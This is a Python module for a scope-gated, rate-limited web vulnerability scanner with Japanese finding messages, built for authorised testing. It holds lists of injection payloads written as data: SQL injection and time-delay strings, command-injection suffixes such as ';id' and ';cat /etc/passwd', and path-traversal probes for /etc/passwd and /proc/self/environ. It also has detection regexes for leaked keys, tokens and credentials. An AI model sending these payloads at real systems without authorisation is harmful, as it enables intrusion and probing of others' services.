"""Scanner — passive analysis and active (detection-only) checks.

Authorized-testing only.

Passive: analyzes ALREADY-CAPTURED traffic (no requests sent). Flags missing
security headers, weak cookie attributes, and likely secret/PII exposure.

Active: sends *detection* probes to identify likely vulnerabilities by matching
well-known error/reflection/output/timing signatures and response differentials.
It reports *likelihood* — it does not exploit, extract data, or attempt code
execution. Every active request:
  * targets an in-scope host (default-deny scope gate), and
  * obeys mandatory rate limits (max concurrency + inter-request delay).

Coverage (active): SQLi (error / quote-balancing / boolean / time),
reflected XSS (context + surviving-character analysis), OS command injection
(output + time), path traversal / LFI, SSTI (multi-engine arithmetic), open
redirect, CRLF / header splitting, XXE (in-band), NoSQL, LDAP, Host-header
injection, and active CORS origin reflection. Injection points are drawn from
query, form, JSON, URL path segments, and (opt-in) cookies / headers.
"""
from __future__ import annotations

import asyncio
import copy
import json
import random
import re
import string
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import parse_qsl, quote, urlencode

import httpx

from .config import settings
from .db import SessionLocal
from .events import event_bus
from .history import record_flow
from .models import Finding
from .scope import scope_manager
from .tools import decode_body, httpx_client_kwargs

# --------------------------------------------------------------------------- #
# Signatures
# --------------------------------------------------------------------------- #
SQL_ERROR_RES = [re.compile(p, re.I) for p in [
    r"you have an error in your sql syntax",
    r"warning:\s+mysqli?",
    r"check the manual that corresponds to your (?:mysql|mariadb) server version",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"unterminated quoted string",
    r"pg_query\(\)|pg_exec\(\)|pg::\w*error|psql:|org\.postgresql\.util\.psqlexception",
    r"syntax error at or near",
    r"sqlite3?\.(?:operationalerror|databaseerror|warning)|sqlite_error|unrecognized token",
    r"ORA-\d{5}|oracle error|quoted string not properly terminated",
    r"microsoft (?:ole db|jet database|sql server|access)|odbc (?:sql server )?driver",
    r"mysql_fetch_(?:array|assoc|row|object)\(\)|num_rows|mysql_num_rows",
    r"supplied argument is not a valid (?:mysql|postgresql|oci|ldap)",
    r"\bSQLSTATE\[|sqlexception|mysqlexception|npgsql\.|com\.mysql\.jdbc|com\.microsoft\.sqlserver",
    r"db2 sql error|sqlcode|sybase message|dynamic sql error|incorrect syntax near",
    r"valid (?:mysql|postgresql) result|division by zero",
]]

# Command-execution output (id / /etc/passwd / Windows ipconfig / dir listing).
CMD_OUTPUT_RE = re.compile(
    r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)"
    r"|root:.*?:0:0:"
    r"|windows ip configuration"
    r"|volume in drive [a-z] is|volume serial number is",
    re.I,
)
NOSQL_ERROR_RE = re.compile(
    r"mongoerror|e11000|\$where|\$regex|bson|mongod?b|command failed with error"
    r"|unexpected token|syntaxerror: unexpected|cast to objectid failed|couldn't connect to server",
    re.I,
)
LDAP_ERROR_RE = re.compile(
    r"javax\.naming\.|ldap:\s*error code|com\.sun\.jndi|invalid dn syntax"
    r"|supplied argument is not a valid ldap|object class violation|ldap_search",
    re.I,
)

# Sensitive data (passive)
CREDITCARD_RE = re.compile(r"\b(?:\d[ -]?){13,19}\b")
AWS_KEY_RE = re.compile(r"\bAKIA[0-9A-Z]{16}\b")
PRIVKEY_RE = re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |)PRIVATE KEY-----")
JWT_RE = re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b")
SECRET_ASSIGN_RE = re.compile(
    r"(?i)\b(api[_-]?key|secret|access[_-]?token|client[_-]?secret|password|passwd)\b"
    r"\s*[:=]\s*['\"]?([A-Za-z0-9._\-]{8,})['\"]?"
)
STACK_TRACE_RE = re.compile(
    r"Traceback \(most recent call last\)"
    r"|Exception in thread"
    r"|\bat [\w.$]+\([\w.]+\.java:\d+\)"
    r"|(?:PHP )?(?:Fatal error|Parse error|Warning):\s"
    r"|System\.[A-Za-z.]+Exception"
    r"|org\.(?:apache|springframework)\.[\w.]+"
    r"|<b>(?:Warning|Fatal error|Notice)</b>"
    r"|Stack trace:"
)
DIRLIST_RE = re.compile(r"(?i)<title>\s*Index of /|<h1>\s*Index of /|Directory Listing For")

MAX_BODY_SCAN = 400_000
SCAN_MAX_TOTAL = int(settings.intruder_max_total)


def _luhn_ok(number: str) -> bool:
    digits = [int(c) for c in number if c.isdigit()]
    if not (13 <= len(digits) <= 19):
        return False
    total, alt = 0, False
    for d in reversed(digits):
        if alt:
            d *= 2
            if d > 9:
                d -= 9
        total += d
        alt = not alt
    return total % 10 == 0


def _redact(s: str, keep: int = 4) -> str:
    s = s.strip()
    if len(s) <= keep * 2:
        return s[:keep] + "…"
    return s[:keep] + "…" + s[-keep:]


def _finding(kind, severity, confidence, title, host, url, method, param, evidence, detail, flow_id=0) -> Dict[str, Any]:
    key = f"{kind}|{title}|{host}|{param}|{url}"
    return {
        "kind": kind, "severity": severity, "confidence": confidence, "title": title,
        "host": host, "url": url, "method": method, "param": param,
        "evidence": evidence[:400], "detail": detail, "dedupe_key": key[:512],
        "flow_id": flow_id,
    }


# --------------------------------------------------------------------------- #
# Passive scanning
# --------------------------------------------------------------------------- #
def _headers_map(pairs: List[List[str]]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for k, v in pairs:
        out[k.lower()] = v
    return out


def passive_scan_flow(row) -> List[Dict[str, Any]]:
    """Analyze one captured flow (Flow row). Returns finding dicts."""
    findings: List[Dict[str, Any]] = []
    try:
        resp_pairs = json.loads(row.resp_headers or "[]")
    except Exception:
        resp_pairs = []
    if not resp_pairs and not row.status_code:
        return findings  # no response captured

    hmap = _headers_map(resp_pairs)
    ctype = hmap.get("content-type", "")
    is_html = "text/html" in ctype
    is_https = row.scheme == "https"
    host, url, method = row.host, row.url, row.method

    def add(sev, conf, title, evidence, detail, param=""):
        findings.append(_finding("passive", sev, conf, title, host, url, method, param, evidence, detail))

    # ---- security headers ----
    if is_html:
        if "content-security-policy" not in hmap:
            add("medium", "firm", "Content-Security-Policy ヘッダ欠如", "", "CSP が無く、XSS 等の緩和が効きません。")
        if "x-frame-options" not in hmap and "frame-ancestors" not in hmap.get("content-security-policy", ""):
            add("low", "firm", "X-Frame-Options 欠如(クリックジャッキング)", "", "X-Frame-Options も CSP frame-ancestors もありません。")
        if "referrer-policy" not in hmap:
            add("info", "firm", "Referrer-Policy 欠如", "", "リファラ制御ヘッダがありません。")
    if "x-content-type-options" not in hmap:
        add("low", "firm", "X-Content-Type-Options: nosniff 欠如", "", "MIME スニッフィング対策がありません。")
    if is_https and "strict-transport-security" not in hmap:
        add("medium", "firm", "Strict-Transport-Security(HSTS)欠如", "", "HTTPS だが HSTS がありません。")
    if "server" in hmap and re.search(r"\d", hmap["server"]):
        add("info", "tentative", "Server ヘッダでバージョン開示", hmap["server"], "Server ヘッダが版数を含みます。")
    if "x-powered-by" in hmap:
        add("info", "tentative", "X-Powered-By で技術スタック開示", hmap["x-powered-by"], "X-Powered-By が実装を開示しています。")
    for h in ("x-aspnet-version", "x-aspnetmvc-version", "x-generator"):
        if h in hmap:
            add("info", "tentative", f"{h} でバージョン開示", hmap[h], f"{h} が版数/実装を開示しています。")

    # ---- CORS misconfiguration ----
    acao = hmap.get("access-control-allow-origin", "")
    acac = hmap.get("access-control-allow-credentials", "").lower()
    if acao == "*" and acac == "true":
        add("high", "firm", "CORS 設定不備(ワイルドカード + credentials)", "ACAO: * / ACAC: true",
            "任意オリジンから認証付きリクエストが許可されています。")
    elif acao == "*":
        add("low", "tentative", "CORS: Access-Control-Allow-Origin が *", acao,
            "全オリジンにレスポンスが読める設定です(機微データなら要注意)。")
    elif acao and acao not in ("null",) and acac == "true":
        add("medium", "tentative", "CORS: オリジン反射 + credentials の疑い", f"ACAO: {acao}",
            "オリジンを反射している可能性。任意オリジン許可なら情報漏えいの恐れ。")

    # ---- Basic auth over HTTP ----
    try:
        req_pairs = json.loads(row.req_headers or "[]")
    except Exception:
        req_pairs = []
    if not is_https:
        for k, v in req_pairs:
            if k.lower() == "authorization" and v.lower().startswith("basic "):
                add("medium", "firm", "HTTP 上で Basic 認証", "Authorization: Basic …",
                    "平文 HTTP で Basic 認証情報が送信されています。")
                break

    # ---- cookies ----
    for k, v in resp_pairs:
        if k.lower() != "set-cookie":
            continue
        name = v.split("=", 1)[0].strip()
        low = v.lower()
        if is_https and "secure" not in low:
            add("medium", "firm", "Cookie に Secure 属性なし", name, f"Set-Cookie: {name}", param=name)
        if "httponly" not in low:
            add("low", "firm", "Cookie に HttpOnly 属性なし", name, f"Set-Cookie: {name}", param=name)
        if "samesite" not in low:
            add("low", "firm", "Cookie に SameSite 属性なし", name, f"Set-Cookie: {name}", param=name)

    # ---- sensitive data in body ----
    body = (row.resp_body or b"")[:MAX_BODY_SCAN]
    if body:
        text = bytes(body).decode("utf-8", "replace")
        if PRIVKEY_RE.search(text):
            add("high", "firm", "秘密鍵の露出", "-----BEGIN PRIVATE KEY-----", "レスポンス本文に秘密鍵ブロックが含まれます。")
        m = AWS_KEY_RE.search(text)
        if m:
            add("high", "firm", "AWS アクセスキーの露出", _redact(m.group(0)), "AWS アクセスキー形式の文字列が露出しています。")
        m = JWT_RE.search(text)
        if m:
            add("medium", "tentative", "JWT トークンの露出", _redact(m.group(0), 6), "本文に JWT らしき文字列があります。")
        for m in CREDITCARD_RE.finditer(text):
            digits = re.sub(r"\D", "", m.group(0))
            if _luhn_ok(digits):
                add("high", "tentative", "クレジットカード番号らしき値", _redact(digits), "Luhn を通過する 13-19 桁が露出しています。")
                break
        m = SECRET_ASSIGN_RE.search(text)
        if m:
            add("medium", "tentative", f"機微情報らしき代入({m.group(1)})", f"{m.group(1)}={_redact(m.group(2))}", "秘密情報らしきキー=値が本文にあります。")
        m = STACK_TRACE_RE.search(text)
        if m:
            add("medium", "firm", "スタックトレース/詳細エラーの露出", m.group(0)[:120],
                "例外・スタックトレースらしき出力が応答に含まれます(内部情報の漏えい)。")
        if DIRLIST_RE.search(text):
            add("medium", "firm", "ディレクトリ一覧の露出", "Index of /",
                "ディレクトリリスティングが有効になっています。")
        if is_https and re.search(r"""(?i)(?:src|href|action)\s*=\s*["']http://""", text):
            add("low", "tentative", "混在コンテンツ(HTTPS 上で http リソース)", "http://…",
                "HTTPS ページが http:// のリソースを参照しています。")

    return findings


# --------------------------------------------------------------------------- #
# Active scanning (detection-only)
# --------------------------------------------------------------------------- #
CATEGORY_TITLES = {
    "sqli": "SQL インジェクションの可能性",
    "xss": "反射型 XSS の可能性",
    "cmdi": "OS コマンドインジェクションの可能性",
    "traversal": "パストラバーサル / LFI の可能性",
    "ssti": "サーバサイドテンプレートインジェクション(SSTI)の可能性",
    "openredirect": "オープンリダイレクトの可能性",
    "crlf": "CRLF インジェクション / HTTP ヘッダ分割の可能性",
    "xxe": "XML 外部実体参照(XXE)の可能性",
    "nosql": "NoSQL インジェクションの可能性",
    "ldap": "LDAP インジェクションの可能性",
    "hostheader": "Host ヘッダインジェクションの可能性",
    "cors": "CORS 設定不備(オリジン反射)の可能性",
    "reflection": "入力値の反射(XSS の足がかり)",
}
ALL_CATEGORIES = [c for c in CATEGORY_TITLES if c != "reflection"]

# File-content signatures proving a path-traversal / LFI read succeeded.
PASSWD_RE = re.compile(r"root:[^:\n]*:0:0:", re.I)
WININI_RE = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support|\[mci extensions\]", re.I)
# Precise /proc/self/environ signature: an env var ONLY at a NUL/line boundary
# with a path-like value. This avoids matching "classpath=", "filepath=",
# "xpath=" etc. that appear in ordinary HTML/JS (a common false positive).
ENVIRON_RE = re.compile(r"(?:^|[\x00\n])(?:PATH|HOME|SHELL|PWD|LOGNAME|USER)=/[^\x00\n]{0,200}")
# Path traversal / LFI probes PAIRED with the signature that proves success
# (the client URL-encodes the raw payloads). Pairing avoids cross-matching
# (a win.ini probe matching passwd text, etc.) and the baseline-absence check
# below avoids flagging pages that already contain the pattern.
TRAVERSAL_PROBES = [
    ("../../../../../../../../etc/passwd", PASSWD_RE),
    ("../../../../../../../../etc/passwd%00", PASSWD_RE),
    ("....//....//....//....//....//....//etc/passwd", PASSWD_RE),
    ("..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", PASSWD_RE),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", PASSWD_RE),
    ("..%252f..%252f..%252f..%252fetc%252fpasswd", PASSWD_RE),
    ("/etc/passwd", PASSWD_RE),
    ("file:///etc/passwd", PASSWD_RE),
    ("..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", WININI_RE),
    ("....\\\\....\\\\....\\\\windows\\win.ini", WININI_RE),
    ("..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", WININI_RE),
    ("/proc/self/environ", ENVIRON_RE),
]
TRAVERSAL_PAYLOADS = [p for p, _ in TRAVERSAL_PROBES]  # for the request estimate
# CRLF injection — the raw CR/LF get URL-encoded and, if reflected into a header, split it.
CRLF_TEMPLATES = ["x\r\n{h}: 1", "x\r\nSet-Cookie: {h}=1", "x\u2028{h}: 1", "x%0d%0a{h}: 1"]

SQLI_ERROR_SUFFIXES = ["'", "\"", "')", "\")", "`", "\\", "';", "\")--", "'--", " --"]
SQLI_BOOL_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR '1'='1' -- ", "' AND '1'='2' -- "),
    (") AND (1=1", ") AND (1=2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
]
SQLI_TIME_TEMPLATES = [
    "' AND SLEEP({d})-- -",
    "\" AND SLEEP({d})-- -",
    "' AND SLEEP({d})#",
    " AND SLEEP({d})",
    "'+(SELECT {rnd} FROM (SELECT(SLEEP({d})))a)+'",
    "' AND (SELECT {rnd} FROM (SELECT(SLEEP({d})))a)-- -",
    "'||(SELECT pg_sleep({d}))||'",
    "';SELECT pg_sleep({d})-- -",
    "' AND (SELECT 1 FROM PG_SLEEP({d}))-- -",
    "'; WAITFOR DELAY '0:0:{d}'-- -",
    "\"; WAITFOR DELAY '0:0:{d}'-- -",
    "' AND 1=(SELECT COUNT(*) FROM GENERATE_SERIES(1,{big}))-- -",
    "' RLIKE SLEEP({d})-- -",
    "' AND BENCHMARK(30000000,MD5('a'))-- -",
]
CMD_OUTPUT_SUFFIXES = [
    ";id", "|id", "||id", "`id`", "$(id)", "& id", "&& id", "\nid",
    "& whoami", "| whoami", "&& whoami", "| type %SYSTEMROOT%\\win.ini",
    "%0aid", "%0a id", ";cat /etc/passwd", "|cat /etc/passwd",
]
CMD_TIME_TEMPLATES = [
    "; sleep {d}", "| sleep {d}", "|| sleep {d}", "`sleep {d}`", "$(sleep {d})",
    "& ping -n {n} 127.0.0.1", "| ping -c {n} 127.0.0.1", "&& sleep {d}",
    "%0asleep {d}", "\nsleep {d}",
]


def _rand_marker() -> str:
    return "zx" + "".join(random.choices(string.ascii_lowercase + string.digits, k=7))


def _similar(a: int, b: int, ratio: float = 0.03, floor: int = 30) -> bool:
    m = max(a, b, 1)
    return abs(a - b) <= max(floor, int(m * ratio))


def _first(res: List[re.Pattern], text: str):
    for rx in res:
        m = rx.search(text)
        if m:
            return m
    return None


@dataclass
class InjPoint:
    location: str  # "query" | "form" | "json" | "path" | "header" | "cookie"
    name: str
    locator: Any   # index (query/form) | path list (json) | seg index (path) | name (header/cookie)
    orig: str


@dataclass
class Probe:
    status: int
    elapsed: float
    length: int
    text: str
    headers: List[Tuple[str, str]] = field(default_factory=list)
    error: str = ""
    # HTTP-history linkage: the recorded flow id (0 if not recorded) plus the
    # request context so a finding can persist the proving exchange on demand.
    flow_id: int = 0
    req_method: str = ""
    req_url: str = ""
    req_path: str = ""
    req_headers: List[Tuple[str, str]] = field(default_factory=list)
    req_body: bytes = b""
    raw_resp: bytes = b""

    def header(self, name: str) -> str:
        name = name.lower()
        for k, v in self.headers:
            if k.lower() == name:
                return v
        return ""


# Task-local handle to the most recent probe, so _record can attach the exact
# proving request/response to a finding without threading it through every call.
# asyncio copies the context into each scan-point task, so concurrent points
# never clobber each other's "last probe".
import contextvars  # noqa: E402
_LAST_PROBE: "contextvars.ContextVar[Optional[Probe]]" = contextvars.ContextVar("_last_probe", default=None)


def _json_leaf_paths(obj, path=None) -> List[Tuple[list, str]]:
    path = path or []
    out: List[Tuple[list, str]] = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            out += _json_leaf_paths(v, path + [k])
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            out += _json_leaf_paths(v, path + [i])
    elif isinstance(obj, (str, int, float)) and not isinstance(obj, bool):
        name = "".join(f"[{p}]" if isinstance(p, int) else f".{p}" for p in path).lstrip(".")
        out.append((path, name or "(root)"))
    return out


def _json_set(obj, path: list, value):
    cur = obj
    for p in path[:-1]:
        cur = cur[p]
    cur[path[-1]] = value


def _parse_cookie(s: str) -> List[list]:
    out: List[list] = []
    for part in s.split(";"):
        part = part.strip()
        if not part:
            continue
        k, _, v = part.partition("=")
        out.append([k.strip(), v])
    return out


# Headers worth fuzzing when header scanning is enabled (added even if absent).
INJECTABLE_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host"]
MAX_PATH_POINTS = 8


def extract_points(path: str, body: str, headers: List[List[str]], scan_headers: bool
                   ) -> Tuple[List[InjPoint], Dict[str, Any]]:
    """Return (points, ctx). ctx carries the parsed request for rebuilding."""
    path_only, _, query = path.partition("?")
    path_segments = path_only.split("/")  # keeps leading "" for the root slash
    qpairs = [list(p) for p in parse_qsl(query, keep_blank_values=True)]
    ctype = ""
    for k, v in headers:
        if k.lower() == "content-type":
            ctype = v
    bpairs: List[list] = []
    json_obj = None
    if "application/json" in ctype and body.strip():
        try:
            json_obj = json.loads(body)
        except Exception:
            json_obj = None
    if json_obj is None and "application/x-www-form-urlencoded" in ctype and body:
        bpairs = [list(p) for p in parse_qsl(body, keep_blank_values=True)]
    is_xml = ("xml" in ctype) and body.strip().startswith("<")

    points: List[InjPoint] = []
    for i, (k, v) in enumerate(qpairs):
        points.append(InjPoint("query", k, i, v))
    for i, (k, v) in enumerate(bpairs):
        points.append(InjPoint("form", k, i, v))
    if json_obj is not None:
        for pathlist, name in _json_leaf_paths(json_obj):
            cur = json_obj
            for p in pathlist:
                cur = cur[p]
            points.append(InjPoint("json", name, pathlist, str(cur)))
    # URL path segments (e.g. /product/1 — the "1" is a common injection point).
    added_path = 0
    for i, seg in enumerate(path_segments):
        if i == 0 or seg == "":
            continue
        points.append(InjPoint("path", f"path[{i}]", i, seg))
        added_path += 1
        if added_path >= MAX_PATH_POINTS:
            break

    if scan_headers:
        for k, v in headers:
            if k.lower() == "cookie":
                for cname, cval in _parse_cookie(v):
                    points.append(InjPoint("cookie", cname, cname, cval))
        for name in INJECTABLE_HEADERS:
            existing = next((v for k, v in headers if k.lower() == name.lower()), None)
            points.append(InjPoint("header", name, name, existing if existing is not None else ""))

    ctx = {"path_only": path_only, "path_segments": path_segments,
           "qpairs": qpairs, "bpairs": bpairs, "json_obj": json_obj,
           "raw_body": body, "ctype": ctype, "is_xml": is_xml, "headers": headers}
    return points, ctx


def _rebuild(ctx: Dict[str, Any], q, b, segs, json_body=None, raw_body=None):
    new_path = "/".join(segs)
    if not new_path.startswith("/"):
        new_path = "/" + new_path
    new_query = urlencode([(k, v) for k, v in q], quote_via=quote)
    if new_query:
        new_path += "?" + new_query
    if json_body is not None:
        body = json_body
    elif b:
        body = urlencode([(k, v) for k, v in b], quote_via=quote)
    elif raw_body is not None:
        body = raw_body
    else:
        body = ""
    return new_path, body


def base_request(ctx: Dict[str, Any]) -> Tuple[str, str, List[Tuple[str, str]]]:
    """Reconstruct the original request (no injection) from ctx."""
    json_body = json.dumps(ctx["json_obj"]) if ctx["json_obj"] is not None else None
    raw = ctx["raw_body"] if (ctx["json_obj"] is None and not ctx["bpairs"]) else None
    path, body = _rebuild(ctx, ctx["qpairs"], ctx["bpairs"], ctx["path_segments"], json_body, raw)
    drop = {"content-length", "transfer-encoding"}
    hdrs = [(k, v) for k, v in ctx["headers"] if k and k.lower() not in drop]
    return path, body, hdrs


def build_variant(ctx: Dict[str, Any], point: InjPoint, value: str,
                  raw_header: bool = False) -> Tuple[str, str, List[Tuple[str, str]]]:
    """Return (path, body, headers) with `value` injected at `point`."""
    q = [list(p) for p in ctx["qpairs"]]
    b = [list(p) for p in ctx["bpairs"]]
    segs = list(ctx["path_segments"])
    headers = [list(h) for h in ctx["headers"]]
    json_body = None
    raw_body = ctx["raw_body"] if (ctx["json_obj"] is None and not ctx["bpairs"]) else None
    loc = point.location

    if loc == "query":
        q[point.locator][1] = value
    elif loc == "form":
        b[point.locator][1] = value
    elif loc == "path":
        segs[point.locator] = quote(value, safe="")
    elif loc == "json":
        obj = copy.deepcopy(ctx["json_obj"])
        _json_set(obj, point.locator, value)
        json_body = json.dumps(obj)
    elif loc == "header":
        hv = value if raw_header else value.replace("\r", "").replace("\n", "")
        done = False
        for h in headers:
            if h[0].lower() == str(point.locator).lower():
                h[1] = hv
                done = True
                break
        if not done:
            headers.append([str(point.locator), hv])
    elif loc == "cookie":
        for h in headers:
            if h[0].lower() == "cookie":
                pairs = _parse_cookie(h[1])
                for cp in pairs:
                    if cp[0] == point.locator:
                        cp[1] = value
                h[1] = "; ".join(f"{k}={v}" for k, v in pairs)
                break

    new_path, body = _rebuild(ctx, q, b, segs, json_body, raw_body)
    drop = {"content-length", "transfer-encoding"}
    hdrs = [(k, v) for k, v in headers if k and k.lower() not in drop]
    return new_path, body, hdrs


@dataclass
class ActiveScan:
    id: str
    scheme: str
    host: str
    port: int
    method: str
    status: str = "running"
    total: int = 0
    done: int = 0
    found: int = 0
    error: str = ""
    stop_flag: bool = False
    record_history: bool = True
    findings: List[Dict[str, Any]] = field(default_factory=list)
    task: Optional[asyncio.Task] = None
    netloc: str = ""
    path_only: str = "/"
    # reachability diagnostics
    resp_seen: int = 0
    resp_authwall: int = 0
    points_tested: int = 0
    send_errors: int = 0
    status_counts: Dict[int, int] = field(default_factory=dict)


# Rough per-point request budget (upper bound) for the runaway cap + progress.
PER_POINT_EST = (
    2  # baselines
    + len(SQLI_ERROR_SUFFIXES) + 2 + len(SQLI_BOOL_PAIRS) * 2 + len(SQLI_TIME_TEMPLATES) + 2
    + len(CMD_OUTPUT_SUFFIXES) + len(CMD_TIME_TEMPLATES) + 2
    + 6  # xss
    + len(TRAVERSAL_PAYLOADS)
    + 6  # ssti
    + 5  # open redirect
    + len(CRLF_TEMPLATES)
    + 4  # nosql
    + 4  # ldap
)
TARGET_EST = 8  # xxe + host header + cors


class ScannerManager:
    def __init__(self) -> None:
        self.scans: Dict[str, ActiveScan] = {}

    def get(self, sid: str) -> Optional[ActiveScan]:
        return self.scans.get(sid)

    def stop(self, sid: str) -> bool:
        s = self.scans.get(sid)
        if not s:
            return False
        s.stop_flag = True
        return True

    def start(self, params: Dict[str, Any]) -> ActiveScan:
        scheme = params.get("scheme", "https")
        host = params["host"]
        port = int(params.get("port") or (443 if scheme == "https" else 80))
        scope_manager.require_in_scope(host)  # default-deny gate

        method = (params.get("method") or "GET").upper()
        path = params.get("path") or "/"
        headers = [list(h) for h in (params.get("headers") or [])]
        body = params.get("body") or ""
        categories = [c for c in (params.get("categories") or ALL_CATEGORIES) if c in CATEGORY_TITLES]
        if not categories:
            raise ValueError("No scan categories selected.")

        techniques = params.get("techniques") or ["error", "boolean", "time", "reflect"]
        use_time = "time" in techniques
        scan_headers = bool(params.get("scan_headers", False))

        points, ctx = extract_points(path, body, headers, scan_headers)
        # Target-level checks (xxe/hostheader/cors) run even with zero params.
        target_cats = {"xxe", "hostheader", "cors"} & set(categories)
        if not points and not target_cats:
            raise ValueError("挿入可能なパラメータがありません(クエリ/フォーム/JSON/パス、または対象ヘッダが必要)。")

        est_total = len(points) * PER_POINT_EST + TARGET_EST
        if est_total > SCAN_MAX_TOTAL:
            raise ValueError(f"推定 {est_total} リクエストは上限 {SCAN_MAX_TOTAL} を超えます。対象/カテゴリ/ヘッダ検査を絞ってください。")

        concurrency = max(1, min(int(params.get("concurrency") or settings.default_max_concurrency), 50))
        delay_ms = max(0, int(params.get("delay_ms") if params.get("delay_ms") is not None else settings.default_min_interval_ms))
        time_delay = max(2, min(int(params.get("time_delay") or 5), 30))
        follow = bool(params.get("follow_redirects", True))

        scan = ActiveScan(id=uuid.uuid4().hex[:12], scheme=scheme, host=host, port=port, method=method,
                          total=max(1, est_total), record_history=bool(params.get("record_history", True)))
        self.scans[scan.id] = scan

        netloc = host if ((scheme == "https" and port == 443) or (scheme == "http" and port == 80)) else f"{host}:{port}"
        scan.netloc = netloc
        scan.path_only = ctx["path_only"]
        scan.points_tested = len(points)
        timeout = float(params.get("timeout") or max(20.0, time_delay * 3))
        verify = bool(params.get("verify_tls", False))

        scan.task = asyncio.create_task(self._run(
            scan, netloc, ctx, points, categories, concurrency, delay_ms,
            timeout, verify, use_time, time_delay, follow,
        ))
        return scan

    async def _run(self, scan, netloc, ctx, points, categories, concurrency,
                   delay_ms, timeout, verify, use_time, time_delay, follow) -> None:
        sem = asyncio.Semaphore(concurrency)
        try:
            async with httpx.AsyncClient(verify=verify, follow_redirects=follow, **httpx_client_kwargs(timeout)) as client:

                async def do_send(method, p, b, hdrs, follow_override=None) -> Probe:
                    url = f"{scan.scheme}://{netloc}{p}"
                    body_bytes = b.encode("utf-8", "replace") if b else b""
                    t0 = time.perf_counter()
                    try:
                        req = client.build_request(method, url, headers=hdrs, content=body_bytes or None)
                        if follow_override is None:
                            resp = await client.send(req)
                        else:
                            resp = await client.send(req, follow_redirects=follow_override)
                        el = time.perf_counter() - t0
                        raw = resp.content
                        text = decode_body(raw, resp.headers.get("content-type", ""))
                        scan.done += 1
                        scan.resp_seen += 1
                        scan.status_counts[resp.status_code] = scan.status_counts.get(resp.status_code, 0) + 1
                        if resp.status_code in (301, 302, 303, 307, 308, 401, 403):
                            scan.resp_authwall += 1
                        probe = Probe(resp.status_code, el, len(raw), text, list(resp.headers.items()),
                                      req_method=method, req_url=url, req_path=p,
                                      req_headers=list(hdrs), req_body=body_bytes, raw_resp=raw)
                        # Record to HTTP history so the tool's own traffic is visible.
                        if scan.record_history:
                            probe.flow_id = record_flow(
                                source="scanner", method=method, scheme=scan.scheme,
                                host=scan.host, port=scan.port, path=p, url=url,
                                req_headers=list(hdrs), req_body=body_bytes,
                                status=resp.status_code, reason=resp.reason_phrase or "",
                                resp_headers=list(resp.headers.items()), resp_body=raw,
                                resp_length=len(raw), mime=resp.headers.get("content-type", ""),
                                duration_ms=int(el * 1000), in_scope=True,
                            )
                        _LAST_PROBE.set(probe)
                        if delay_ms:
                            await asyncio.sleep(delay_ms / 1000.0)
                        await asyncio.sleep(0)  # keep the loop responsive
                        return probe
                    except Exception as exc:
                        scan.done += 1
                        scan.send_errors += 1
                        probe = Probe(0, time.perf_counter() - t0, 0, "", [], str(exc),
                                      req_method=method, req_url=url, req_path=p,
                                      req_headers=list(hdrs), req_body=body_bytes)
                        _LAST_PROBE.set(probe)
                        return probe

                async def send(point, value, follow_override=None, raw_header=False) -> Probe:
                    p, b, hdrs = build_variant(ctx, point, value, raw_header=raw_header)
                    return await do_send(scan.method, p, b, hdrs, follow_override)

                async def scan_point(point: InjPoint):
                    async with sem:
                        if scan.stop_flag:
                            return
                        await self._scan_one_point(scan, point, categories, send, use_time, time_delay, netloc)

                # Target-level checks first (cheap, run once).
                await self._target_checks(scan, ctx, categories, do_send, netloc)

                pending: set = set()
                for pt in points:
                    if scan.stop_flag:
                        break
                    pending.add(asyncio.create_task(scan_point(pt)))
                    if len(pending) >= concurrency * 2:
                        _d, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                if pending:
                    await asyncio.wait(pending)

            # Diagnostics when nothing was detected — so the user can see WHY.
            if scan.found == 0 and not scan.stop_flag:
                base_url = f"{scan.scheme}://{netloc}{ctx['path_only']}"
                dist = ", ".join(f"{code}×{n}" for code, n in sorted(scan.status_counts.items()))
                if scan.resp_seen > 0 and scan.resp_authwall / scan.resp_seen > 0.6:
                    info = _finding("active", "info", "tentative",
                                    "診断が対象に到達していない可能性",
                                    scan.host, base_url, scan.method, "",
                                    f"{scan.resp_authwall}/{scan.resp_seen} の応答が 3xx/401/403。認証・セッション・リダイレクトで検査対象に到達していない可能性があります。ステータス分布: {dist}",
                                    "有効なセッション Cookie を含むリクエストを履歴から送る、リダイレクト先を直接指定する、などをお試しください。")
                    info["dedupe_key"] = f"active|reachability|{scan.host}|{ctx['path_only']}"
                else:
                    detail = (f"挿入点 {scan.points_tested} を検査し {scan.done} リクエスト送信、"
                              f"シグネチャ一致なし。ステータス分布: {dist or 'なし'}。送信エラー {scan.send_errors} 件。")
                    hint = "パラメータが本当に検査対象か(クエリ/フォーム/JSON/パス)、認証やCSRFトークンで弾かれていないか、時間ベースが有効かをご確認ください。ヘッダ/Cookie 検査の有効化や、脆弱なパラメータを含むリクエストを履歴から送るのも有効です。"
                    if scan.send_errors and scan.send_errors >= max(1, scan.done // 2):
                        hint = "送信の多くが失敗しています。ホスト/ポート/スキーム/到達性(ファイアウォール・TLS)を確認してください。"
                    info = _finding("active", "info", "tentative",
                                    "能動診断サマリ(検出なし)",
                                    scan.host, base_url, scan.method, "", detail, hint)
                    info["dedupe_key"] = f"active|summary|{scan.host}|{scan.method}|{ctx['path_only']}|{int(time.time())}"
                if persist_finding(info):
                    scan.findings.append(info); scan.found += 1
